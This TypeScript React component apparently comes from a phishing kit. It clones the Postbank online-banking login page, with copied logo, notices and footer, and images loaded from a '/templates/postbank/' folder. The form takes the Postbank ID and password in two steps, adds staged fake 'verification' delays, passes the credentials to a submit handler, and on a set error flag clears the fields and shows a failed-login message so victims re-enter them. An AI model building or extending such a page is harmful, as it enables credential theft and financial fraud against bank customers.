import React, { useState, useEffect, useRef } from 'react';
import { AlertTriangle, HelpCircle, Shield } from 'lucide-react';
import Loading from './Loading';

interface LoginFormProps {
  onSubmit: (data: { username: string; password: string }) => void;
  showError?: boolean;
}

const LoginForm: React.FC<LoginFormProps> = ({ onSubmit, showError = false }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);
  const [showPasswordField, setShowPasswordField] = useState(false);
  
  const usernameRef = useRef<HTMLInputElement>(null);
  const passwordRef = useRef<HTMLInputElement>(null);
  
  // Auto-focus the username field on component mount
  useEffect(() => {
    if (usernameRef.current) {
      usernameRef.current.focus();
    }
  }, []);

  // Clear form fields when error is shown
  useEffect(() => {
    if (showError) {
      setUsername('');
      setPassword('');
      setShowPasswordField(false);
      if (usernameRef.current) {
        usernameRef.current.focus();
      }
    }
  }, [showError]);

  // Handle the first step - validate Postbank ID and show password field
  const handleFirstStep = async () => {
    if (!username.trim()) return;
    
    setIsLoading(true);
    setLoadingMessage('Postbank ID wird überprüft...');
    
    // Simulate ID validation
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    setIsLoading(false);
    setShowPasswordField(true);
    
    // Focus password field after it appears
    setTimeout(() => {
      if (passwordRef.current) {
        passwordRef.current.focus();
      }
    }, 1000);
  };

  // Handle form submission with realistic loading times
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // If password field is not shown yet, handle first step
    if (!showPasswordField) {
      await handleFirstStep();
      return;
    }
    
    // If password field is shown, handle final login
    if (!username.trim() || !password.trim()) {
      return;
    }
    
    setIsLoading(true);
    setAttemptCount(prev => prev + 1);
    
    // Set appropriate loading message based on attempt
    if (attemptCount === 0) {
      setLoadingMessage('Anmeldedaten werden überprüft');
      await new Promise(resolve => setTimeout(resolve, 2500));
    } else {
      setLoadingMessage('Sicherheitsanalyse läuft');
      await new Promise(resolve => setTimeout(resolve, 3500));
    }
    
    try {
      await onSubmit({ username: username.trim(), password: password.trim() });
    } catch (error) {
      console.error('Error submitting form:', error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .desktop-sidebar {
              width: 100% !important;
              min-height: auto !important;
              order: 2 !important;
            }
            .login-container {
              flex-direction: column !important;
              gap: 0 !important;
              padding: 20px !important;
              align-items: center !important;
            }
            .login-form-area {
              max-width: 100% !important;
              width: 100% !important;
              padding-top: 20px !important;
              order: 1 !important;
            }
            .mobile-title {
              font-size: 2rem !important;
              text-align: center !important;
            }
            .login-form-card {
              margin: 20px 0 !important;
              padding: 40px 30px !important;
            }
            .main-background {
              background-attachment: scroll !important;
              background-position: center !important;
              padding: 0 !important;
            }
            .sidebar-content {
              padding: 20px !important;
              gap: 30px !important;
            }
            .sidebar-footer {
              position: static !important;
              margin-top: 0 !important;
            }
            .sidebar-section {
              text-align: center !important;
            }
            .sidebar-section img {
              max-width: 300px !important;
              margin: 0 auto 15px auto !important;
            }
          }
          
          @media (max-width: 480px) {
            .login-form-card {
              padding: 25px 20px !important;
              margin: 10px 0 !important;
              border-radius: 6px !important;
            }
            .mobile-title {
              font-size: 1.8rem !important;
            }
            .sidebar-content {
              padding: 15px !important;
              gap: 25px !important;
            }
            .sidebar-section img {
              max-width: 250px !important;
            }
          }
        `}
      </style>
      
      {isLoading && (
        <Loading 
          message={loadingMessage}
          type="login"
          showProgress={true}
          duration={attemptCount === 0 ? 2.5 : 3.5}
        />
      )}
      
      <div className="main-background" style={{ 
        minHeight: '100vh',
        backgroundImage: 'url(/templates/postbank/images/postbank-woman-laptop.jpg)',
        backgroundSize: 'cover',
        backgroundPosition: 'top left',
        backgroundRepeat: 'no-repeat',
        backgroundAttachment: 'fixed',
        fontFamily: 'Arial, sans-serif',
        margin: 0,
        padding: 0,
        width: '100vw',
        position: 'relative',
        display: 'flex',
        alignItems: 'flex-start',
        justifyContent: 'center'
      }}>
        {/* Centered Container */}
        <div className="login-container" style={{
          maxWidth: '1280px',
          width: '100%',
          margin: '0 auto',
          padding: '0 20px',
          display: 'flex',
          gap: '270px',
          alignItems: 'stretch',
          position: 'relative',
          justifyContent: 'center',
          minHeight: '100vh'
        }}>
          {/* Left Side - Login Form Area */}
          <div className="login-form-area" style={{
            maxWidth: '600px',
            width: '100%',
            display: 'flex',
            flexDirection: 'column',
            gap: '20px',
            paddingTop: '40px'
          }}>
            {/* System Maintenance Notification */}
        <div style={{
              backgroundColor: '#e8f4fd',
              border: '1px solid #b3d9f2',
              borderRadius: '4px',
              padding: '16px 20px',
          display: 'flex',
          alignItems: 'flex-start',
              gap: '12px',
              boxShadow: 'none'
            }}>
              <div style={{
                width: '20px',
                height: '20px',
                backgroundColor: '#0066cc',
                borderRadius: '3px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexShrink: 0,
                marginTop: '2px'
              }}>
                <span style={{ color: 'white', fontSize: '12px', fontWeight: 'bold' }}>i</span>
              </div>
              <div>
                <h4 style={{ 
                  margin: '0 0 8px 0', 
                  fontSize: '14px', 
                  fontWeight: 'bold',
                  color: '#333'
                }}>
                  Einschränkungen durch Systemarbeiten
                </h4>
                <p style={{ 
                  margin: '0 0 8px 0', 
                  fontSize: '13px', 
                  color: '#333',
                  lineHeight: '1.4'
                }}>
                  Aufgrund von Systemarbeiten stehen Ihnen <strong>Samstag, 23. August</strong> (ca. 04:00 Uhr) bis <strong>Sonntag, 24. August</strong> (im Laufe des Abends) das Online-Banking, die Postbank App und der Sprachcomputer im Telefon-Banking nicht zur Verfügung. Der telefonische Kundenservice ist wie gewohnt für Sie erreichbar.
                </p>
                <p style={{ 
                  margin: '0 0 4px 0', 
                  fontSize: '13px', 
                  color: '#333'
                }}>
                  Wir bitten um Ihr Verständnis.
                </p>
                  <p style={{
                  margin: '0 0 8px 0', 
                  fontSize: '13px', 
                  color: '#333',
                  fontWeight: 'bold'
                }}>
                  Ihre Postbank
                </p>
                <a href="#" style={{
                  color: '#0066cc',
                  fontSize: '13px',
                  textDecoration: 'underline'
                }}>
                  Mehr erfahren
                </a>
              </div>
                </div>

            {/* Login Box */}
            <div className="login-form-card" style={{
              backgroundColor: '#fc0',
              borderRadius: '4px',
              padding: '30px',
              boxShadow: 'none'
            }}>
              {/* Postbank Logo */}
              <div style={{
                marginBottom: '20px'
              }}>
                <svg 
                  width="152px" 
                  height="56px" 
                  viewBox="0 0 152 56" 
                  version="1.1" 
                  xmlns="http://www.w3.org/2000/svg"
                  style={{
                    height: '60px',
                    width: 'auto'
                  }}
                >
                  <defs>
                    <rect id="path-1" x="0" y="0" width="152" height="56"/>
                    <polygon id="path-3" points="0.0253521127 20.6792958 119.773944 20.6792958 119.773944 0.342676056 0.0253521127 0.342676056"/>
                  </defs>
                  <g stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
                    <mask id="mask-2" fill="white">
                      <use xlinkHref="#path-1"/>
                    </mask>
                    <g mask="url(#mask-2)">
                      <g transform="translate(16.000000, 16.000000)">
                        <g strokeWidth="1" fill="none">
                          <mask id="mask-4" fill="white">
                            <use xlinkHref="#path-3"/>
                          </mask>
                          <path d="M37.745493,19.4340845 L40.5485915,19.4340845 L40.5485915,14.1287324 L41.7295775,14.1287324 C44.7329577,14.1287324 47.1152113,12.948169 47.1152113,9.68450704 C47.1152113,6.34098592 44.3323944,5.46 41.2892958,5.46 L37.745493,5.46 L37.745493,19.4340845 Z M40.5485915,7.66225352 L41.5297183,7.66225352 C42.9709859,7.66225352 44.1921127,8.22295775 44.1921127,9.84422535 C44.1921127,11.466338 42.9312676,11.9264789 41.5297183,11.9264789 L40.5485915,11.9264789 L40.5485915,7.66225352 Z M75.8564789,19.4340845 L78.3730986,19.4340845 L78.3730986,18.1301408 C79.115493,19.1349296 80.2685915,19.6740845 81.4622535,19.6740845 C84.5539437,19.6740845 85.83,17.0716901 85.83,14.2491549 C85.83,11.4059155 84.6591549,8.88338028 81.576338,8.88338028 C80.213662,8.88338028 79.1569014,9.53197183 78.4538028,10.5021127 L78.4538028,4.41887324 L75.8564789,4.41887324 L75.8564789,19.4340845 Z M78.4592958,14.2491549 C78.4592958,12.8078873 79.1543662,10.9656338 80.8757746,10.9656338 C82.6178873,10.9656338 83.1414085,12.8674648 83.1414085,14.2491549 C83.1414085,15.6705634 82.5976056,17.5922535 80.8360563,17.5922535 C79.0542254,17.5922535 78.4592958,15.7107042 78.4592958,14.2491549 Z M110.203944,19.4340845 L110.203944,4.41887324 L112.887042,4.41887324 L112.887042,13.248169 L112.927183,13.248169 L116.13,9.12380282 L119.293521,9.12380282 L115.449296,13.7285915 L119.773944,19.4340845 L116.370423,19.4340845 L112.927183,14.4287324 L112.887042,14.4287324 L112.887042,19.4340845 L110.203944,19.4340845 Z M98.4312676,19.4340845 L98.4312676,9.12380282 L100.974085,9.12380282 L100.974085,10.5249296 L101.013803,10.5249296 C101.85507,9.34394366 102.995493,8.88338028 104.397042,8.88338028 C106.839718,8.88338028 107.900704,10.6056338 107.900704,12.9278873 L107.900704,19.4340845 L105.218451,19.4340845 L105.218451,13.9288732 C105.218451,12.6671831 105.198169,10.9656338 103.476761,10.9656338 C101.534366,10.9656338 101.113944,13.068169 101.113944,14.3890141 L101.113944,19.4340845 L98.4312676,19.4340845 Z M66.3629577,9.26408451 L66.1825352,11.2859155 C65.3611268,11.0057746 64.7611268,10.8456338 63.78,10.8456338 C63.0595775,10.8456338 62.1980282,11.105493 62.1980282,11.9864789 C62.1980282,13.6284507 66.8632394,12.5873239 66.8632394,16.3111268 C66.8632394,18.713662 64.7209859,19.6740845 62.5385915,19.6740845 C61.5177465,19.6740845 60.4770423,19.494507 59.495493,19.2342254 L59.6560563,17.0319718 C60.4969014,17.4523944 61.3778873,17.7122535 62.298169,17.7122535 C62.9788732,17.7122535 64.0601408,17.4523944 64.0601408,16.4514085 C64.0601408,14.4287324 59.3953521,15.8108451 59.3953521,12.0866197 C59.3953521,9.86450704 61.3377465,8.88338028 63.4398592,8.88338028 C64.7011268,8.88338028 65.5212676,9.08408451 66.3629577,9.26408451 Z M69.2919718,16.3309859 L69.2919718,11.0856338 L67.3098592,11.0856338 L67.3098592,9.12380282 L69.2919718,9.12380282 L69.2919718,7.06140845 L71.9746479,6.20070423 L71.9746479,9.12380282 L74.3573239,9.12380282 L74.3573239,11.0856338 L71.9746479,11.0856338 L71.9746479,15.8907042 C71.9746479,16.7712676 72.2146479,17.5922535 73.235493,17.5922535 C73.716338,17.5922535 74.1769014,17.4921127 74.4570423,17.3121127 L74.5369014,19.4340845 C73.9766197,19.5942254 73.355493,19.6740845 72.5552113,19.6740845 C70.4526761,19.6740845 69.2919718,18.3730986 69.2919718,16.3309859 Z M50.0691549,14.0214085 C50.0691549,12.4330986 50.91,10.865493 52.6516901,10.865493 C54.413662,10.865493 55.254507,12.3916901 55.254507,14.0214085 C55.254507,15.7952113 54.7140845,17.6923944 52.6516901,17.6923944 C50.6095775,17.6923944 50.0691549,15.774507 50.0691549,14.0214085 Z M47.2660563,14.3505634 C47.2660563,17.3729577 49.248169,19.7826761 52.6516901,19.7826761 C56.0750704,19.7826761 58.0571831,17.3729577 58.0571831,14.3505634 C58.0571831,10.8785915 55.7150704,8.77521127 52.6516901,8.77521127 C49.6085915,8.77521127 47.2660563,10.8785915 47.2660563,14.3505634 Z M89.5288732,16.4514085 C89.5288732,14.8694366 91.3107042,14.6691549 92.5119718,14.6691549 L93.6726761,14.6691549 C93.6726761,15.4702817 93.5530986,16.2109859 93.1128169,16.7915493 C92.6923944,17.351831 92.0509859,17.7122535 91.2304225,17.7122535 C90.27,17.7122535 89.5288732,17.3319718 89.5288732,16.4514085 Z M88.1674648,11.9661972 C89.0683099,11.2859155 90.2095775,10.8456338 91.3504225,10.8456338 C92.9323944,10.8456338 93.6726761,11.4059155 93.6726761,13.068169 L92.1916901,13.068169 C91.0702817,13.068169 89.7494366,13.1678873 88.7277465,13.6685915 C87.7069014,14.1688732 86.9666197,15.0701408 86.9666197,16.6111268 C86.9666197,18.5733803 88.7480282,19.6740845 90.5704225,19.6740845 C91.7911268,19.6740845 93.1326761,19.0339437 93.7533803,17.8930986 L93.7935211,17.8930986 C93.8129577,18.2129577 93.8129577,18.893662 93.9135211,19.4340845 L96.2759155,19.4340845 C96.2159155,18.6338028 96.1757746,17.9129577 96.155493,17.1316901 C96.1356338,16.3711268 96.1157746,15.5902817 96.1157746,14.5491549 L96.1157746,13.2283099 C96.1157746,10.1847887 94.8143662,8.88338028 91.6711268,8.88338028 C90.5302817,8.88338028 89.1287324,9.18380282 88.0876056,9.66422535 L88.1674648,11.9661972 L88.1674648,11.9661972 Z" fill="#173568" mask="url(#mask-4)"/>
                          <path d="M12.1453521,0.673943662 L24.7778873,0.342676056 C14.9780282,6.19647887 11.681831,15.1766197 10.8608451,20.7042254 L0,20.7042254 C0.796056338,14.6450704 5.70676056,4.6043662 12.1453521,0.673943662" fill="#173568" mask="url(#mask-4)"/>
                        </g>
                        <path d="M30.5192958,8.64084507 C25.5202817,11.7752113 24.0583099,16.7091549 23.7532394,18.5940845 L20.5039437,18.5940845 C21.0667606,15.276338 23.1532394,10.9791549 26.2364789,8.72408451 C26.2622535,8.70507042 30.5192958,8.64084507 30.5192958,8.64084507" fill="#173568"/>
                        <path d="M20.8288732,5.54239437 L28.2312676,5.33492958 C22.1552113,8.5428169 19.1269014,15.2767606 18.6185915,19.4340845 L12.9891549,19.4340845 C13.4657746,16.0250704 15.7990141,9.31478873 20.8288732,5.54239437" fill="#D7232D"/>
                      </g>
                    </g>
                  </g>
                </svg>
              </div>

              {/* Guten Morgen Heading */}
              <h1 className="mobile-title" style={{
                fontSize: '40px',
                color: '#333333',
                margin: '0 0 10px 0',
                lineHeight: '1.1',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                fontWeight: '700'
              }}>
                Guten Morgen
              </h1>

              <p style={{
                fontSize: '18px',
                color: '#333',
                margin: '0 0 25px 0',
                lineHeight: '1.4',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                Bitte geben Sie Ihre Zugangsdaten ein.
              </p>

              {showError && (
                <div style={{
                  backgroundColor: '#ffebee',
                  border: '1px solid #f44336',
                  borderRadius: '4px',
                  padding: '12px',
                  marginBottom: '20px',
                  fontSize: '14px',
                  color: '#d32f2f'
                }}>
                  Ihr Login war nicht erfolgreich. Bitte überprüfen Sie Ihre Eingabe.
                </div>
              )}

              <form onSubmit={handleSubmit}>
                {/* Postbank ID Field */}
                <div style={{ marginBottom: '15px' }}>
                  <label style={{
                    display: 'block',
                    fontSize: '14px',
                    color: '#0018a8',
                    marginBottom: '8px',
                    fontWeight: '500'
                  }}>
                    Postbank ID
                  </label>
                  <input
                    ref={usernameRef}
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    style={{
                      width: '100%',
                      padding: '12px',
                      border: '1px solid #ccc',
                      borderRadius: '4px',
                      fontSize: '16px',
                      backgroundColor: 'white',
                      boxSizing: 'border-box',
                      boxShadow: 'none'
                    }}
                    required
                    autoFocus
                  />
                </div>

                {/* Password Field - Only show after username is entered */}
                {showPasswordField && (
                  <div style={{ marginBottom: '15px' }}>
                    <input
                      ref={passwordRef}
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Passwort"
                      style={{
                        width: '100%',
                        padding: '12px',
                        border: '1px solid #ccc',
                        borderRadius: '4px',
                        fontSize: '16px',
                        backgroundColor: 'white',
                        boxSizing: 'border-box',
                        boxShadow: 'none'
                      }}
                      required
                    />
              </div>
                )}
                
                {/* Bottom Section with Links and Button */}
                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'flex-end',
                  marginTop: '20px'
                }}>
                  {/* Left Side - Links */}
                  <div style={{
                    display: 'flex',
                    flexDirection: 'column',
                    gap: '10px'
                  }}>
                    <a href="#" style={{
                      color: '#0018a8',
                      fontSize: '14px',
                      textDecoration: 'underline',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      Jetzt Postbank ID einrichten
                    </a>
                    <a href="#" style={{
                      color: '#0018a8',
                      fontSize: '14px',
                      textDecoration: 'underline',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                    }}>
                      Zugangsdaten vergessen?
                    </a>
                  </div>

                  {/* Right Side - Button */}
                  <button
                    type="submit"
                    disabled={isLoading}
                    style={{
                      backgroundColor: '#0018a8',
                      color: 'white',
                      border: 'none',
                      borderRadius: '4px',
                      padding: '12px 24px',
                      fontSize: '16px',
                      cursor: isLoading ? 'not-allowed' : 'pointer',
                      opacity: isLoading ? 0.7 : 1,
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                      fontWeight: '700',
                      boxShadow: 'none'
                    }}
                  >
                    {isLoading ? 'Wird verarbeitet...' : (showPasswordField ? 'Anmelden' : 'Weiter')}
                  </button>
                </div>
              </form>
                </div>
              </div>

          {/* Right Sidebar */}
          <div className="desktop-sidebar" style={{
            width: '350px',
            backgroundColor: 'white',
            display: 'flex',
            flexDirection: 'column',
            minHeight: '100vh'
          }}>
            {/* Sidebar Content */}
            <div className="sidebar-content" style={{
              padding: '20px',
              display: 'flex',
              flexDirection: 'column',
              gap: '20px',
              flex: '1'
            }}>
            {/* Bargeld-Code Section */}
            <div className="sidebar-section">
              <img 
                src="/templates/postbank/images/bargeld-code.jpg" 
                alt="Bargeld-Code" 
                style={{
                  width: '100%',
                  borderRadius: '4px',
                  marginBottom: '15px'
                }}
              />
              <h3 style={{
                fontSize: '16px',
                fontWeight: '700',
                color: '#333',
                margin: '0 0 10px 0',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                Tomaten. Zahnbürsten. Oder nur Bargeld.
              </h3>
              <p style={{
                fontSize: '14px',
                color: '#333',
                margin: '0 0 15px 0',
                lineHeight: '1.4',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                Der Postbank Bargeld-Code für Ein- und Auszahlungen in über 12.500 Geschäften bundesweit. Ohne Geldautomat, ohne Karte, ohne Einkauf.
              </p>
              <a href="#" style={{
                color: '#0066cc',
                fontSize: '14px',
                textDecoration: 'underline',
                fontWeight: '700',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                Jetzt Informieren
              </a>
              </div>

            {/* Sicherheitshinweise Section */}
            <div className="sidebar-section">
              <div style={{ display: 'flex', alignItems: 'flex-start', marginBottom: '15px' }}>
                <AlertTriangle 
                  size={20} 
                  style={{ 
                    marginRight: '12px',
                    color: '#333',
                    marginTop: '2px',
                    flexShrink: 0
                  }} 
                />
                <h3 style={{
                  fontSize: '16px',
                  fontWeight: '700',
                  color: '#333',
                  margin: '0',
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                }}>
                  Sicherheitshinweise
                </h3>
              </div>
              <p style={{
                fontSize: '14px',
                color: '#333',
                margin: '0 0 15px 0',
                lineHeight: '1.4',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                Aktuell wird ein erhöhtes Aufkommen von Anrufen falscher Bankmitarbeiter festgestellt.
              </p>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                <a href="#" style={{
                  color: '#0066cc',
                  fontSize: '14px',
                  textDecoration: 'underline',
                  fontWeight: '700',
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                }}>
                  Link zu den aktuellen Sicherheitshinweisen
                </a>
                <a href="#" style={{
                  color: '#0066cc',
                  fontSize: '14px',
                  textDecoration: 'underline',
                  fontWeight: '700',
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                }}>
                  Link zu Sicherheit im Überblick
                </a>
              </div>
            </div>

                        {/* Schnelle Hilfe und Services Section */}
            <div className="sidebar-section">
              <div style={{ display: 'flex', alignItems: 'flex-start', marginBottom: '15px' }}>
                <HelpCircle 
                  size={20} 
                  style={{ 
                    marginRight: '12px',
                    color: '#333',
                    marginTop: '2px',
                    flexShrink: 0
                  }} 
                />
                <h3 style={{
                  fontSize: '16px',
                  fontWeight: '700',
                  color: '#333',
                  margin: '0',
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                }}>
                  Schnelle Hilfe und Services
                </h3>
              </div>
              <p style={{
                fontSize: '14px',
                color: '#333',
                margin: '0 0 15px 0',
                lineHeight: '1.4',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                Hier finden Sie unsere Services und Hilfe zu Ihrem Online-Banking.
              </p>
              <a href="#" style={{
                color: '#0066cc',
                fontSize: '14px',
                textDecoration: 'underline',
                fontWeight: '700',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                Link zu Services und Hilfe
              </a>
            </div>

            {/* Unsere Sicherheitsverfahren Section */}
            <div className="sidebar-section">
              <div style={{ display: 'flex', alignItems: 'flex-start', marginBottom: '15px' }}>
                <Shield 
                  size={20} 
                  style={{ 
                    marginRight: '12px',
                    color: '#333',
                    marginTop: '2px',
                    flexShrink: 0
                  }} 
                />
                <h3 style={{
                  fontSize: '16px',
                  fontWeight: '700',
                  color: '#333',
                  margin: '0',
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                }}>
                  Unsere Sicherheitsverfahren
                </h3>
              </div>
              <p style={{
                fontSize: '14px',
                color: '#333',
                margin: '0 0 15px 0',
                lineHeight: '1.4',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                Alles Wissenswerte rund um BestSign.
              </p>
              <a href="#" style={{
                color: '#0066cc',
                fontSize: '14px',
                textDecoration: 'underline',
                fontWeight: '700',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                Link zu den Sicherheitsverfahren
                            </a>
            </div>
            </div>
            
            {/* Footer Section - Yellow Background */}
            <div className="sidebar-footer" style={{ 
              backgroundColor: '#fc0',
              padding: '20px',
              fontSize: '13px',
              marginTop: 'auto'
            }}>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                {/* Footer Links */}
                <div style={{ 
                  display: 'flex', 
                  flexWrap: 'wrap', 
                  gap: '15px',
                  fontSize: '13px'
                }}>
                  <a href="#" style={{ 
                    color: '#0018a8', 
                    textDecoration: 'none',
                    fontWeight: '700',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>Erste Schritte</a>
                  <a href="#" style={{ 
                    color: '#0018a8', 
                    textDecoration: 'none',
                    fontWeight: '700',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>Terminvereinbarung</a>
                  <a href="#" style={{ 
                    color: '#0018a8', 
                    textDecoration: 'none',
                    fontWeight: '700',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>Demo-Konto</a>
                  <a href="#" style={{ 
                    color: '#0018a8', 
                    textDecoration: 'none',
                    fontWeight: '700',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>Kontakt</a>
                  <a href="#" style={{ 
                    color: '#0018a8', 
                    textDecoration: 'none',
                    fontWeight: '700',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>Impressum</a>
                  <a href="#" style={{ 
                    color: '#0018a8', 
                    textDecoration: 'none',
                    fontWeight: '700',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>Rechtshinweise</a>
                  <a href="#" style={{ 
                    color: '#0018a8', 
                    textDecoration: 'none',
                    fontWeight: '700',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>Datenschutz</a>
                  <a href="#" style={{ 
                    color: '#0018a8', 
                    textDecoration: 'none',
                    fontWeight: '700',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                  }}>Cookie-Einstellungen</a>
                </div>
                
                {/* Copyright */}
              <div style={{
                  color: '#333',
                  fontSize: '13px',
                  marginTop: '10px',
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
                }}>
                  © 2025 Postbank – eine Niederlassung der Deutsche Bank AG
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default LoginForm;